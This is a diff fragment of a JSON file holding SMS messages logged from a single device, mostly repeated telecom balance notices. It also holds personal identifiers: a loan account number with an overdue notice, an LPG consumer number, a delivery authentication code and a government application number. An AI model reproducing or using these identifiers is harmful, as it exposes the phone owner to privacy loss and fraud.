+    "message_body": "GOOD NEWS! You've SAVED Rs198 by using more than 9GB DATA with Vi Guarantee, at NO EXTRA COST. Track usage and validity at viapp.onelink.me/bSC3/ViG1",
+    "received_at": "2026-02-04T09:48:03.909Z"
+  },
+  {
+    "id": 628,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-BAJAJF-S",
+    "message_body": "Alert!\nOur authorized agency D S ENTERPRISES will contact/visit you to collect overdues for LAN L2WBTE11026790. For any concerns, reach us at https://s.bflcomm.in/BAJAJF/m48A1G58\nBajaj Finance Ltd",
+    "received_at": "2026-02-04T08:52:55.365Z"
+  },
+  {
+    "id": 621,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JD-INDANE-S",
+    "message_body": "Invoice generated for Rs. 862.Share DAC 508255 on delivery. Download eInvoice https://cx.indianoil.in/webcenter/portal/LPG/pages_h?cId=16266664104\nINDANE",
+    "received_at": "2026-02-04T03:14:38.726Z"
+  },
+  {
+    "id": 620,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JX-INDANE-S",
+    "message_body": "Order for Cons No 7234898080 is registered with Ref No.2-005422221368.Refil expected delivery: 2 days.Pay by https://payit.cc/INDANE/IYGsulH528\nINDANE",
+    "received_at": "2026-02-04T03:14:34.332Z"
+  },
+  {
+    "id": 619,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Binge at night without limits! Surf,Stream,Share nonstop from 12-6am within same pack at NO extra cost, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4#",
+    "received_at": "2026-02-04T00:00:37.684Z"
+  },
+  {
+    "id": 603,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "BP-RJAGRI-G",
+    "message_body": "आपका आवेदन Hort_Slr/2025-26/1588654 सफलतापूर्वक सबमिट किया गया - कृषि विभाग, राजस्थान सरकार",
+    "received_at": "2026-02-01T08:30:10.729Z"
+  },
+  {
+    "id": 602,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:10:09.835Z"
+  },
+  {
+    "id": 601,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:10:02.084Z"
+  },
+  {
+    "id": 600,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:56.075Z"
+  },
+  {
+    "id": 599,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:49.788Z"
+  },
+  {
+    "id": 598,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:43.668Z"
+  },
+  {
+    "id": 597,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:38.168Z"
+  },
+  {
+    "id": 596,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:31.620Z"
+  },
+  {
+    "id": 595,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:26.101Z"
+  },
+  {
+    "id": 594,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:09:00.876Z"
+  },
+  {
+    "id": 593,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:54.754Z"
+  },
+  {
+    "id": 592,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:48.767Z"
+  },
+  {
+    "id": 591,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:42.319Z"
+  },
+  {
+    "id": 590,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:36.111Z"
+  },
+  {
+    "id": 589,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:30.424Z"
+  },
+  {
+    "id": 588,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:24.728Z"
+  },
+  {
+    "id": 587,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:18.400Z"
+  },
+  {
+    "id": 586,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:16.116Z"
+  },
+  {
+    "id": 585,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:12.760Z"
+  },
+  {
+    "id": 584,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:07.030Z"
+  },
+  {
+    "id": 583,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:05.216Z"
+  },
+  {
+    "id": 582,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:03.039Z"
+  },
+  {
+    "id": 581,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:08:00.006Z"
+  },
+  {
+    "id": 580,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:57.885Z"
+  },
+  {
+    "id": 579,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:55.520Z"
+  },
+  {
+    "id": 578,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:53.055Z"
+  },
+  {
+    "id": 577,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:50.841Z"
+  },
+  {
+    "id": 576,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:48.317Z"
+  },
+  {
+    "id": 575,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:45.237Z"
+  },
+  {
+    "id": 574,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:40.580Z"
+  },
+  {
+    "id": 573,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:38.472Z"
+  },
+  {
+    "id": 572,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:36.322Z"
+  },
+  {
+    "id": 571,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:34.109Z"
+  },
+  {
+    "id": 570,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:31.273Z"
+  },
+  {
+    "id": 569,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:29.035Z"
+  },
+  {
+    "id": 568,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:27.112Z"
+  },
+  {
+    "id": 567,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:24.853Z"
+  },
+  {
+    "id": 566,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:23.064Z"
+  },
+  {
+    "id": 565,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:21.294Z"
+  },
+  {
+    "id": 564,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:18.608Z"
+  },
+  {
+    "id": 563,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:16.712Z"
+  },
+  {
+    "id": 562,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:14.902Z"
+  },
+  {
+    "id": 561,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:13.113Z"
+  },
+  {
+    "id": 560,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:11.069Z"
+  },
+  {
+    "id": 559,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:09.200Z"
+  },
+  {
+    "id": 558,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:07.392Z"
+  },
+  {
+    "id": 557,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:04.704Z"
+  },
+  {
+    "id": 556,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:02.921Z"
+  },
+  {
+    "id": 555,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:07:01.113Z"
+  },
+  {
+    "id": 554,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:59.292Z"
+  },
+  {
+    "id": 553,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:47.696Z"
+  },
+  {
+    "id": 552,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:44.979Z"
+  },
+  {
+    "id": 551,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:42.543Z"
+  },
+  {
+    "id": 550,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:40.062Z"
+  },
+  {
+    "id": 549,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:37.567Z"
+  },
+  {
+    "id": 548,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:33.856Z"
+  },
+  {
+    "id": 547,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:31.115Z"
+  },
+  {
+    "id": 546,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:28.686Z"
+  },
+  {
+    "id": 545,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:25.863Z"
+  },
+  {
+    "id": 544,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:22.535Z"
+  },
+  {
+    "id": 543,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:20.009Z"
+  },
+  {
+    "id": 542,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:17.385Z"
+  },
+  {
+    "id": 541,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:14.358Z"
+  },
+  {
+    "id": 540,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:11.760Z"
+  },
+  {
+    "id": 539,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:08.428Z"
+  },
+  {
+    "id": 538,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:05.518Z"
+  },
+  {
+    "id": 537,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:06:02.052Z"
+  },
+  {
+    "id": 536,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:59.481Z"
+  },
+  {
+    "id": 535,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:56.107Z"
+  },
+  {
+    "id": 534,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:53.369Z"
+  },
+  {
+    "id": 533,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:50.459Z"
+  },
+  {
+    "id": 532,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:46.558Z"
+  },
+  {
+    "id": 531,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:43.615Z"
+  },
+  {
+    "id": 530,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:40.616Z"
+  },
+  {
+    "id": 529,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:37.225Z"
+  },
+  {
+    "id": 528,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:33.745Z"
+  },
+  {
+    "id": 527,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:29.833Z"
+  },
+  {
+    "id": 526,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:24.603Z"
+  },
+  {
+    "id": 525,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:21.366Z"
+  },
+  {
+    "id": 524,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:18.495Z"
+  },
+  {
+    "id": 523,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:15.279Z"
+  },
+  {
+    "id": 522,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:11.453Z"
+  },
+  {
+    "id": 521,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:06.484Z"
+  },
+  {
+    "id": 520,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:03.036Z"
+  },
+  {
+    "id": 519,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:05:00.084Z"
+  },
+  {
+    "id": 518,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:56.877Z"
+  },
+  {
+    "id": 517,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:53.672Z"
+  },
+  {
+    "id": 516,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:48.893Z"
+  },
+  {
+    "id": 515,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:47.605Z"
+  },
+  {
+    "id": 514,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:46.345Z"
+  },
+  {
+    "id": 513,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:46.027Z"
+  },
+  {
+    "id": 512,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:44.719Z"
+  },
+  {
+    "id": 511,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:43.476Z"
+  },
+  {
+    "id": 510,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:42.303Z"
+  },
+  {
+    "id": 509,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:41.076Z"
+  },
+  {
+    "id": 508,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:39.783Z"
+  },
+  {
+    "id": 507,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:38.509Z"
+  },
+  {
+    "id": 506,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:37.208Z"
+  },
+  {
+    "id": 505,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:35.932Z"
+  },
+  {
+    "id": 504,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:34.323Z"
+  },
+  {
+    "id": 503,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:33.050Z"
+  },
+  {
+    "id": 502,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:31.624Z"
+  },
+  {
+    "id": 501,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:30.030Z"
+  },
+  {
+    "id": 500,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:28.739Z"
+  },
+  {
+    "id": 499,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:27.458Z"
+  },
+  {
+    "id": 498,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:26.278Z"
+  },
+  {
+    "id": 497,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
